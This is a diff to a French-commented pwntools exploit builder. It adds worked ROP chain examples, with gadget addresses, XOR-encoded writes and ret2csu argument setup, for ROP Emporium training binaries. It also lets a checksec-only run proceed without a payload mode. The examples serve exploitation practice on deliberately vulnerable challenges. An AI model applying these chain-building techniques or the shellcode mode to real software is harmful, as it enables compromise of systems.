@@ -713,6 +713,52 @@ Exemples:
 
   # shellcode local /bin/sh passe en argv
   python3 payload2.py --run --argv-safe --target ./binaries/bin/bof shellcode --builtin-sh
+
+  # callme: trois appels avec les arguments attendus par le challenge
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/callme call \\
+    --pop-rdi-rsi-rdx 0x40093c \\
+    --arg-rdi 0xdeadbeefdeadbeef \\
+    --arg-rsi 0xcafebabecafebabe \\
+    --arg-rdx 0xd00df00dd00df00d \\
+    --func 0x400720 --func 0x400740 --func 0x4006f0
+
+  # write4: ecrire "flag.txt" en .data puis appeler print_file
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/write4 write \\
+    --where 0x601028 \\
+    --data "flag.txt" --nul-terminate \\
+    --pop-write 0x400690 \\
+    --write-gadget 0x400628 \\
+    --write-order dst-value \\
+    --pop-rdi 0x400693 \\
+    --call-addr 0x400510
+
+  # badchars: ecrire une chaine XOR-ee, la decoder octet par octet, puis appeler print_file
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/badchars badchars \\
+    --where 0x601038 \\
+    --data "flag.txt" --nul-terminate \\
+    --badchars "0x78 0x67 0x61 0x2e" \\
+    --xor-key 2 \\
+    --pop-write 0x40069c --write-gadget 0x400634 --write-order value-dst \\
+    --pop-xor 0x4006a0 --xor-gadget 0x400628 --xor-order key-addr \\
+    --pop-rdi 0x4006a3 --call-addr 0x400510
+
+  # ret2csu: controler rdi/rsi/rdx avec les gadgets __libc_csu_init
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/ret2csu ret2csu \\
+    --csu-pop 0x40089a \\
+    --csu-call 0x400880 \\
+    --call-ptr 0x600e48 \\
+    --arg-rdi 0xdeadbeefdeadbeef \\
+    --arg-rsi 0xcafebabecafebabe \\
+    --arg-rdx 0xd00df00dd00df00d \\
+    --next-addr 0x4007b1
+
+  # compose: payload ultra precis, utile pour fluff ou chains sur mesure
+  python3 payload2.py --run --input stdin --target ./binaries/rop_emporium/fluff compose \\
+    --part addr:0x400741 \\
+    --part addr:0x40062a \\
+    --part u64:0xdeadbeefdeadbeef \\
+    --part addr:0x400628 \\
+    --part addr:0x400620
 """
 
     parser = argparse.ArgumentParser(
@@ -768,7 +814,6 @@ Exemples:
 
     subparsers = parser.add_subparsers(
         dest="mode",
-        required=True,
         metavar="{shellcode,jump,chain,system,call,write,badchars,pivot,ret2csu,compose}",
     )
 
@@ -876,7 +921,9 @@ Trouver les adresses:
 Exemple callme:
   python3 payload2.py --run --input stdin --target ./callme call \\
     --pop-rdi-rsi-rdx 0x40093c \\
-    --arg-rdi 1 --arg-rsi 2 --arg-rdx 3 \\
+    --arg-rdi 0xdeadbeefdeadbeef \\
+    --arg-rsi 0xcafebabecafebabe \\
+    --arg-rdx 0xd00df00dd00df00d \\
     --func 0x400720 --func 0x400740 --func 0x4006f0
 
 Exemple avec gadgets separes:
@@ -1083,7 +1130,12 @@ Exemple:
 
 
 def main() -> None:
-    args = build_parser().parse_args()
+    parser = build_parser()
+    args = parser.parse_args()
+
+    if args.mode is None and not args.checksec:
+        parser.error("choose a payload mode, or use --checksec alone to inspect the target")
+
     require_pwntools()
 
     context.update(arch="amd64", os="linux")
@@ -1092,6 +1144,8 @@ def main() -> None:
 
     if args.checksec:
         log.info("\n%s", elf.checksec())
+        if args.mode is None:
+            return
 
     payload = args.builder(args)
     if args.argv_safe:
